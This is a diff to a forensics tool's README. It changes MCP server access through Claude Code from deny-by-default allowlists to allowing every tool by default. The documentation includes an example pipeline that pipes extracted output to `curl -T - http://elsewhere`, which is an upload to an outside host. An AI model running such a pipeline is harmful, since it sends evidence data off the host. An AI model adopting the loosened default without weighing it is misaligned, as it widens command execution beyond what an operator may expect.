@@ -239,7 +239,7 @@ list of known compromised hosts and users.
 - **Import screenshots** — multi-select PNG/JPEG/WebP; single **Import** button auto-detects artifact format (CSV/JSON/log)
 - **Evidence drop folder** — each case has a `drop/` folder; anything copied in (subfolders included) is auto-imported in the background via the same chain as the Import button (images → screenshot evidence), then moved to `_processed/` or `_failed/`; failures surface in a dashboard banner + notifications; every outcome (imported/failed/pending, with reason) is appended to a running `drop-log.txt` in the same folder
 - **External tool runner** (Settings → Tools) — run your **own locally-installed** Hayabusa / Velociraptor CLI / Suricata / Snort / YARA against raw evidence the Companion can't parse (EVTX/PCAP/files), then ingest the tool's *output* through the existing importers. Configure the binary path + args per tool (never bundled/downloaded). Importing a raw EVTX/PCAP from the dashboard — or dropping raw files in a case's `drop/` folder — shows a header banner that **asks once per batch** before running (auto-run is opt-in per tool); each tool also has a one-click "update rules" button. **Add your own custom tools** too (name, binary, command, update command, extensions) — their output is auto-detected and routed to the right importer. No-shell argv, path-contained, runs from the tool's own dir, off by default
-- **MCP through Claude Code** (Settings → Tools) — point case evidence at the MCP servers **you already configured in Claude Code** (SIFT, REMnux, windows-triage). The Companion does not speak MCP, stores no server URL or token, and spawns no `npx`: it asks Claude Code, which holds the credentials, to make the call. **Requires Claude Code installed and authenticated on the Companion host.** What you configure here is policy — a **tool allowlist** (empty = nothing may run) and a **command allowlist** per server, plus how evidence reaches it. Read [Using your MCP servers](#using-your-mcp-servers) before allowing one that exposes a command runner: doing so grants command execution on that host
+- **MCP through Claude Code** (Settings → Tools) — point case evidence at the MCP servers **you already configured in Claude Code** (SIFT, REMnux, windows-triage). The Companion does not speak MCP, stores no server URL or token, and spawns no `npx`: it asks Claude Code, which holds the credentials, to make the call. **Requires Claude Code installed and authenticated on the Companion host.** By default a server may run **everything it offers**. Optional per-server **tool** and **command** allowlists can narrow that, and you configure how evidence reaches it. Read [Using your MCP servers](#using-your-mcp-servers) before using one that exposes a command runner: that means command execution on that host
 - **Import undo/redo** — roll back/forward to exact pre-import state (no re-synthesis); multi-level per-case stack
 - **Custom (declarative) importers** — teach a new file format with a JSON definition (no code); LLM-authorable via a built-in prompt, auto-detected + imported like a built-in, with built-in/custom precedence
 - **Evidence-first** — written to disk + audit log before analysis; SHA-256 dedup (disable via `DFIR_DEDUP=off`)
@@ -511,41 +511,38 @@ Nothing here is a substitute for judgement about what to run, and importing with
 dangerous — every MCP import pushes an undo checkpoint, so a run that turns out to be noise is one
 click from being rolled back.
 
-### Read this before registering a server that runs commands
+### What using a server grants
 
-**Allowing a tool is not the same as allowing a task.** Some MCP servers expose fine-grained tools —
-`check_service`, `check_autorun`, one per question. Others expose a single *command runner* that
-executes whatever you hand it. SIFT's `run_command` states it can execute "most SIFT-installed tools
-… including curl, wget, dd, fdisk, and python3"; REMnux's `run_tool` takes an entire shell pipeline.
+**By default, everything the server offers.** That is deliberate: Claude Code already lets you call
+any tool on any server you configured, so requiring you to re-enumerate them here would have been
+stricter than your own daily use — and a second place to describe the same server.
 
-**Permitting one of those tools grants command execution on that host.** That is a reasonable thing
-to accept on an isolated forensics network, where the analysis boxes are yours and the evidence is
-already on your LAN. It is not a reasonable thing to do anywhere else, and no amount of
-configuration here changes that — the trust boundary is the network, not the allowlist.
+Worth knowing what "everything" includes. Some servers expose fine-grained tools — `check_service`,
+`check_autorun`, one per question. Others expose a single **command runner** that executes whatever
+you hand it: SIFT's `run_command` states it can execute "most SIFT-installed tools … including curl,
+wget, dd, fdisk, and python3", and REMnux's `run_tool` takes an entire shell pipeline. Using such a
+server from the Companion means command execution on that host — reasonable on an isolated forensics
+network, where the analysis boxes are yours and the evidence is already on your LAN, and not
+reasonable anywhere else.
 
-Two allowlists bound what a registered server may do:
+Two **optional** lists narrow it when you want that:
 
-| Setting | Applies to | Empty means |
+| Setting | Applies to | Blank means |
 |---|---|---|
-| **Allowed tools** | every server | **nothing may run** — name each tool you want |
-| **Allowed commands** | calls that carry a command argument | **no command may run** — name each binary |
-
-Both deny by default, because the risk of a control that is off until configured is that it stays
-off. The command allowlist is only consulted when a call actually carries a command, so a server
-with fine-grained tools needs no command allowlist at all.
+| **Restrict to tools** | every call | every tool the server offers |
+| **Restrict to commands** | calls carrying a command argument | no command restriction |
 
 Commands are matched **by basename**, so `grep` and `/usr/bin/grep` are one rule. Every stage of a
 pipeline is checked, not just the first — `oledump.py s.doc | curl -T - http://elsewhere` needs both
 `oledump.py` and `curl` permitted. A command using shell substitution (`$(…)`, backticks, `${…}`) is
 refused outright, because what it would run cannot be known in advance.
 
-**What the command allowlist does not do.** It bounds *which* binaries run, never what a permitted
-one can do. Permitting `dd` permits writing to any path that server's user can write to; permitting
+**What the command list does not do.** It bounds *which* binaries run, never what a permitted one can
+do — permitting `dd` permits writing to any path that server's user can write to; permitting
 `python3` permits arbitrary code. It also keys on well-known parameter names (`command`, `cmd`,
-`argv`) — a server that names its command parameter something unusual is not caught. That is an
-accepted limit: the control exists so an operator does not *under-estimate* the reach they granted,
-not to contain a server that is actively hostile. Do not register a server you would not trust to
-describe its own tools honestly.
+`argv`), so a server naming its command parameter something unusual is not caught. It exists to help
+an operator who wants to narrow their own access, not to contain a server they should not have
+configured in the first place.
 
 ### Getting evidence to the server
 
